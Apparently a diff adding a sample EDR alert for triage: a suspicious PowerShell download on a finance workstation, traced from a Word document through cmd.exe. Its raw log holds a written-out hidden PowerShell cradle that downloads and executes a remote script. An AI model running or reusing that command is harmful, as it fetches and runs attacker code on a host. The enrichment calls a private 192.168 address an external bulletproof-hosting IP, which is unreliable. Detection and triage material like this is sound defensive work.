@@ -1,0 +1,28 @@
+Alert Metadata:
+Alert Name: Suspicious PowerShell Download
+Severity: High
+Timestamp: 2026-07-18T10:15:00Z
+Sensor: CrowdStrike Falcon
+
+Raw Log Data:
+event_type: ProcessCreation
+timestamp: "2026-07-18T10:15:00Z"
+hostname: "WKSTN-FIN-042"
+user: "DOMAIN\\jsmith"
+process:
+  image_path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+  command_line: "powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://192.168.105.44:8080/a'))"
+  process_id: 8432
+  parent_process_id: 1104
+parent_process:
+  image_path: "C:\\Windows\\System32\\cmd.exe"
+hashes:
+  sha256: "9F91A4E90B051515E8B1A0022AA675FDF0DF54C62B0A82485E1AA02CAEEB872A"
+
+Artifact Panel Context:
+
+Process Lineage: WINWORD.EXE -> cmd.exe -> powershell.exe
+
+IP Reputation (192.168.105.44): External IP, 0/89 on VirusTotal, ASN registered to bulletproof hosting provider.
+
+File Origin: Outlook.exe downloaded "Q3_Financial_Review.doc" 5 minutes prior.
